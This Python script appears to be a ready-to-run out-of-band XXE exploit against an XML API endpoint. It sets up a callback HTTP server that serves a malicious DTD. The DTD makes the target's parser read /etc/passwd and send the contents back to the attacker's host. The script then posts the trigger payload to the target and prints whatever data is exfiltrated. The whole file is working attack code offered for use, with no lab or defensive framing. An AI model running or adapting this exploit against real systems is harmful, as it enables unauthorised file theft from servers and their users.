import socket
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

# -----------------------------------------------------------------------------
# TACTICAL CONFIGURATION
# -----------------------------------------------------------------------------
TARGET_URL = "http://target.local/api/invoice"
DTD_PATH = "/xxe.dtd"
# -----------------------------------------------------------------------------

class OOBXXEHandler(BaseHTTPRequestHandler):
    """
    Professional-grade handler for serving malicious DTDs and capturing 
    exfiltrated data via OOB callbacks.
    """
    def log_message(self, format, *args):
        # Suppress standard HTTP logging for a cleaner console output
        return

    def do_GET(self):
        parsed_url = urllib.parse.urlparse(self.path)
        path = parsed_url.path
        query = urllib.parse.parse_qs(parsed_url.query)

        if path == DTD_PATH:
            # Serve the malicious DTD
            # The DTD uses parameter entity nesting to bypass XML parser restrictions
            # %file -> reads target file
            # %eval -> defines the %exfiltrate entity dynamically
            # %exfiltrate -> triggers the final HTTP request with the file content
            dtd_content = (
                f'<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
                f'<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://{self.server.attacker_ip}:{self.server.attacker_port}/?data=%file;'>">\n'
                f'%eval;\n'
                f'%exfiltrate;'
            )
            
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.end_headers()
            self.wfile.write(dtd_content.encode("utf-8"))
            print(f"[*] Served malicious DTD to target.")
            return

        # Handle the data exfiltration callback
        data_param = query.get("data", [None])[0]
        if data_param:
            # Decode the URL-encoded file content
            decoded_data = urllib.parse.unquote(data_param)
            self.server.exfiltrated_data = decoded_data
            self.server.data_received_event.set()
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()

def get_routable_ip(target_host):
    """
    Determines the local IP address that is routable to the target host.
    This is critical for OOB XXE to ensure the victim can reach the callback server.
    """
    try:
        # Create a UDP socket (no actual data is sent)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            # Attempt to "connect" to the target host on a common port (e.g., 80)
            # This forces the OS to select the correct local interface for routing
            s.connect((target_host, 80))
            return s.getsockname()[0]
    except Exception as e:
        print(f"[-] IP Discovery failed: {e}. Falling back to 0.0.0.0")
        return "0.0.0.0"

def main():
    # 1. Environment Setup
    from urllib.parse import urlparse
    target_host = urlparse(TARGET_URL).hostname
    if not target_host:
        print("[-] Invalid Target URL.")
        return

    attacker_ip = get_routable_ip(target_host)
    
    # Bind to port 0 to let the OS assign a free ephemeral port
    server = HTTPServer(("0.0.0.0", 0), OOBXXEHandler)
    attacker_port = server.server_address[1]
    
    # Attach state to the server object for access within the handler
    server.attacker_ip = attacker_ip
    server.attacker_port = attacker_port
    server.exfiltrated_data = None
    server.data_received_event = threading.Event()

    print(f"[+] Attacker IP: {attacker_ip}")
    print(f"[+] Listening Port: {attacker_port}")
    print(f"[+] Callback URL: http://{attacker_ip}:{attacker_port}")

    # 2. Start Callback Server in Background
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    # 3. Craft and Send the Trigger Payload
    # The initial XML defines a parameter entity %remote that fetches the external DTD.
    # Once %remote is expanded, the DTD's logic is executed by the target's XML parser.
    xml_payload = (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE root [\n'
        f'  <!ENTITY % remote SYSTEM "http://{attacker_ip}:{attacker_port}{DTD_PATH}">\n'
        f'  %remote;\n'
        f']>\n'
        f'<root>XXE_TRIGGER</root>'
    )

    print(f"[*] Sending trigger payload to {TARGET_URL}...")
    try:
        # We use a timeout to ensure the script doesn't hang if the target is unresponsive
        requests.post(
            TARGET_URL, 
            data=xml_payload, 
            headers={"Content-Type": "application/xml"}, 
            timeout=10
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")

    # 4. Await Exfiltration
    print("[*] Waiting for exfiltration callback...")
    if server.data_received_event.wait(timeout=20):
        print("\n" + "="*40)
        print("[+] SUCCESS: Data Exfiltrated")
        print("="*40)
        print(server.exfiltrated_data)
        print("="*40 + "\n")
    else:
        print("[-] Timeout: No callback received from target.")

    # Cleanup
    server.shutdown()
    print("[*] Server shutdown. Operation complete.")

if __name__ == "__main__":
    main()
